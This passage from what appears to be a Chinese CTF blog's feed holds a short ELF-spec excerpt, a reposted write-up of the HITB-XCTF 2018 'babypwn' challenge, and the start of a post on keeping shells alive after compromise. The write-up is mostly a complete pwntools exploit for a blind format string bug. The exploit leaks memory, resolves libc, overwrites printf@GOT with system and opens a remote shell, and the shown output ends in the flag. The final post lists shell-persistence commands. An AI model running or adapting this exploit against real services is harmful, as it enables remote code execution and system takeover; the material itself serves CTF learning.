<li>Shared objects may also (or instead) specify the address and size of an array of function pointers. Each element of this array is a pointer to a function to be executed by the dynamic linker. Each array element is the size of a pointer in the programming model followed by the object containing the array. The address of the array of initialization function pointers is specified by the <code>DT_INIT_ARRAY</code> entry in the dynamic structure. Similarly, the address of the array of pre-initialization functions is specified by <code>DT_PREINIT_ARRAY</code>and the address of the array of termination functions is specified by <code>DT_FINI_ARRAY</code>. The size of each array is specified by the <code>DT_INIT_ARRAYSZ</code>, <code>DT_PREINIT_ARRAYSZ</code>, and <code>DT_FINI_ARRAYSZ</code> entries.</li>
</ul>
<hr>
<ul>
<li>The addresses contained in the initialization and termination arrays are function pointers as defined by the processor supplement for each processor. On some architectures, a function pointer may not contain the actual address of the function.</li>
</ul>
<hr>
<ul>
<li><p>The functions pointed to in the arrays specified by <code>DT_INIT_ARRAY</code> and by <code>DT_PREINIT_ARRAY</code> are executed by the dynamic linker in the same order in which their addresses appear in the array; those specified by <code>DT_FINI_ARRAY</code> are executed in reverse order.</p>
</li>
<li><p>If an object contains both <code>DT_INIT</code> and <code>DT_INIT_ARRAY</code> entries, the function referenced by the <code>DT_INIT</code> entry is processed before those referenced by the <code>DT_INIT_ARRAY</code> entry for that object. If an object contains both <code>DT_FINI</code> and <code>DT_FINI_ARRAY</code> entries, the functions referenced by the <code>DT_FINI_ARRAY</code> entry are processed before the one referenced by the <code>DT_FINI</code> entry for that object.</p>
</li>
</ul>
<hr>
<ul>
<li>Although the atexit(BA_OS) termination processing normally will be done, it is not guaranteed to have executed upon process death. In particular, the process will not execute the termination processing if it calls <code>_exit</code>[see exit(BA_OS)] or if the process dies because it received a signal that it neither caught nor ignored.</li>
</ul>
<hr>
<ul>
<li>The processor supplement for each processor specifies whether the dynamic linker is responsible for calling the executable file&#39;s initialization function or registering the executable file&#39;s termination function with <code>atexit</code>(BA_OS). Termination functions specified by users via the <code>atexit</code>(BA_OS) mechanism must be executed before any termination functions of shared objects.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 编译 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[blind attack:HITB-XCTF Quals 2018 - babypwn]]></title>
      <url>/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/</url>
      <content type="html"><![CDATA[<p>From <a href="https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/" target="_blank" rel="external">https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/</a></p>
<h2 id="Challenge-description"><a href="#Challenge-description" class="headerlink" title="Challenge description"></a>Challenge description</h2><p>nc 47.75.182.113 9999</p>
<h2 id="Challenge-resolution"><a href="#Challenge-resolution" class="headerlink" title="Challenge resolution"></a>Challenge resolution</h2><h3 id="Introducing-ourselves"><a href="#Introducing-ourselves" class="headerlink" title="Introducing ourselves"></a>Introducing ourselves</h3><p>Using netcat to connect to the challenge, we are greeted with the following message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">&lt;NOTHING...&gt;</div></pre></td></tr></table></figure>
<p>Very talkative server, I appreciate that…<br>Maybe we should introduce ourselves :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent             # My input</div><div class="line">Hello, I&apos;m Florent             # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>So, it seems that the server is sending our input back to us (or is called Florent as well, which is likely not the case…).<br>At this point, one of the possible vulnerabilities that comes to our mind is a format string vulnerability :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent</div><div class="line">Hello, I&apos;m Florent</div><div class="line">%p %p %p %p %p                                                     # My input</div><div class="line">(nil) (nil) 0x7f2a89d352f0 0x7f2a8a02f780 0x7f2a8a256700           # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>By sending <code>%p</code> to the server, it replies to us with an address to which a pointer refers.<br>Unfortunately for us, we don’t have access to the binary or its source code.<br>But here we are : a blind format string vulnerability !</p>
<h3 id="Further-knowing-the-server-or-getting-our-hands-dirty"><a href="#Further-knowing-the-server-or-getting-our-hands-dirty" class="headerlink" title="Further knowing the server (or getting our hands dirty)"></a>Further knowing the server (or getting our hands dirty)</h3><p>Now it’s time to find a way to grab the flag.<br>I’ve already played with format strings vulnerabilities but never blindly.<br>While looking on the net for information on how I could efficiently leak usable addresses from the binary, I came across a challenge from the 33c3 CTF entitled <code>Eat, Sleep Pwn, Repeat</code> or <code>ESPR</code> (which is also the name of the German team which organized the 33c3 CTF).<br>The situation is pretty much the same and I started looking at write-ups of the challenge.<br>I stumbled across these 2 excellent ressources that I encourage you to take a look at :</p>
<ul>
<li><a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/README.md" target="_blank" rel="external">Write-up from @jay_f0xtr0t:</a></li>
<li><a href="https://youtu.be/XuzuFUGuQv0" target="_blank" rel="external">Video from @LiveOverflow:</a></li>
</ul>
<p>In order to solve the challenge, I used the script from <a href="https://twitter.com/jay_f0xtr0t" target="_blank" rel="external">@jay_f0xtr0t</a> (<a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/espr.py" target="_blank" rel="external">available here</a>) that I adapted a little bit.</p>
<p>Below is the explanation of what the different parts of the code do :</p>
<p>First, we connect to the challenge (obviously) and set the architecture accordingly.<br>The challenge is a 64-bit binary : our <code>%p</code> inputs reveal addresses like <code>0x7f2a8a02f780</code> which start with <code>0x7f</code> and are 6 bytes long.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div></pre></td></tr></table></figure>
<p>The <code>exec_payload</code> function is the function that exploits the format string vulnerability strictly speaking.<br>We prepend an arbitrary value (<code>_EOF</code> in this case but it could have been something else…) to our payload and the function will parse the server’s response until it reaches our value.<br>We ignore <code>\n</code> because if the server is using the <code>gets</code> function (or similar) for reading our input, the fact that there is a newline character will cause a weird behaviour : the function will replace <code>\n</code> with <code>\x00</code> (null byte) and we will get the output twice.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div></pre></td></tr></table></figure>
<p>The <code>find_elf</code> function attempts to find an address that might be in the ELF binary.<br>To do so, it looks for an address starting with <code>0x400</code> (because <code>0x400000</code> is the default base address for binaries).<br>The address that we find will be useful later when we will use the <code>DynELF</code> function from PwnTools.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_leak_point</code> function attempts to find the correct offset so that our input refers to itself and is sent back to us.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div></pre></td></tr></table></figure>
<p>The <code>leak</code> function leaks data from the address given as argument.<br>Some workarounds were made by the initial creator to handle the case of the special <code>\n</code> that we previously mentionned.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div></pre></td></tr></table></figure>
<p>Now using <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="external"><code>DynELF</code></a> from PwnTools, we can find the addresses of the <code>printf</code> and <code>system</code>functions.<br>The idea behind this is to overwrite the <code>printf</code> address from the Global Offset Table (GOT) with the one from <code>system</code>.<br>By doing so, when the server will attempt to reply to our request, it will use the <code>system</code> function instead of the <code>printf</code> function and thus execute the payload we send.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_plt_got</code> function attempts to find the address of the GOT inside the Procedure Linkage Table (PLT).<br>Indeed, the addresses for the <code>printf</code> and <code>system</code> functions we found before are in reality jumps to other addresses.<br>So if we find the GOT, we will be able to have the real address of the <code>printf</code>function from the GOT.<br>If you don’t get this point, you may want to take a look at <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank" rel="external">this video</a> from <a href="https://twitter.com/liveoverflow" target="_blank" rel="external">@LiveOverflow</a>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># PLT/GOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div></pre></td></tr></table></figure>
<p>The <code>forge_exploit</code> function generates the final payload to be send to the server, replacing the value at the given address by the one we choose.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div></pre></td></tr></table></figure>
<p>Below is the full exploit code :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div><div class="line"></div><div class="line">DEPTH = <span class="number">100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div><div class="line"></div><div class="line">start_address_elf = find_elf(DEPTH)</div><div class="line">log.info(<span class="string">'Using address %s'</span> % hex(start_address_elf))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div><div class="line"></div><div class="line">leak_point = find_leak_point()</div><div class="line">log.success(<span class="string">'FOUND leak point %d'</span> % leak_point)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div><div class="line"></div><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># type PLTGOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line">got_addr = find_plt_got()</div><div class="line">log.success(<span class="string">'FOUND GOT Address: %s'</span> % hex(got_addr))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div><div class="line"></div><div class="line">printf_got = find_printf()</div><div class="line">log.success(<span class="string">'FOUND printf@GOT : %s'</span> % hex(printf_got))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div><div class="line"></div><div class="line">log.info(<span class="string">"SENDING PAYLOAD, PEW PEW !!!"</span>)</div><div class="line">exec_payload(forge_exploit(printf_got, system_addr))</div><div class="line">conn.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">log.success(<span class="string">"ENJOY YOUR SHELL :)"</span>)</div><div class="line">conn.interactive()</div><div class="line"></div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h3 id="Revealing-its-secret"><a href="#Revealing-its-secret" class="headerlink" title="Revealing its secret"></a>Revealing its secret</h3><p>It’s now time to run our exploit :</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# python exploit.py</div><div class="line"></div><div class="line">[+] Opening connection to 47.75.182.113 on port 9999: Done</div><div class="line">[*] Finding ELF. This might take a few seconds...</div><div class="line">[+] FOUND ELF !</div><div class="line">[*] Using address 0x40076d</div><div class="line">[*] Finding leak point</div><div class="line">[+] FOUND leak point 8</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">[*] PT_DYNAMIC</div><div class="line">[*] PT_DYNAMIC header = 0x400040</div><div class="line">[*] PT_DYNAMIC count = 0x9</div><div class="line">[*] PT_DYNAMIC @ 0x600e20</div><div class="line">[+] Resolving 'printf' in 'libc.so': 0x7f02b722e168</div><div class="line">[*] Trying lookup based on Build ID: b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] Skipping unavialable libc b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[+] FOUND GOT Address: 0x601000</div><div class="line">[+] FOUND printf@GOT : 0x601020</div><div class="line">[*] SENDING PAYLOAD, PEW PEW !!!</div><div class="line">[+] ENJOY YOUR SHELL :)</div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> ls</div><div class="line">babypwn</div><div class="line">bin</div><div class="line">dev</div><div class="line">flag</div><div class="line">lib</div><div class="line">lib32</div><div class="line">lib64</div><div class="line"><span class="meta">$</span> cat flag</div><div class="line">HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> format string </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shell之后的操作]]></title>
      <url>/2018/04/10/shell%E4%B9%8B%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！</p>
<h3 id="0x01-shell"><a href="#0x01-shell" class="headerlink" title="0x01 shell"></a>0x01 shell</h3><p>首先还是得讲<a href="/2017/12/09/反弹Shell/">反弹shell和正向连接shell</a></p>
<p>前面的这篇文章有了很好的讲解</p>
<h3 id="0x02-延时操作"><a href="#0x02-延时操作" class="headerlink" title="0x02 延时操作"></a>0x02 延时操作</h3><p>若是你上面的操作都不可实现，那么不妨尝试利用下面的指令</p>
<h4 id="timeout指令"><a href="#timeout指令" class="headerlink" title="timeout指令"></a>timeout指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">timeout 3000 /bin/bash</div><div class="line">timeout 3000 /bin/sh</div></pre></td></tr></table></figure>
<p>timeout是linux上常见指令，当你想长时间连上shell不断开的话，不妨使用此命令。</p>
<h4 id="sleep指令"><a href="#sleep指令" class="headerlink" title="sleep指令"></a>sleep指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sleep 3		    终端睡眠3秒</div><div class="line">sleep infinity  终端睡眠无限长事件</div></pre></td></tr></table></figure>
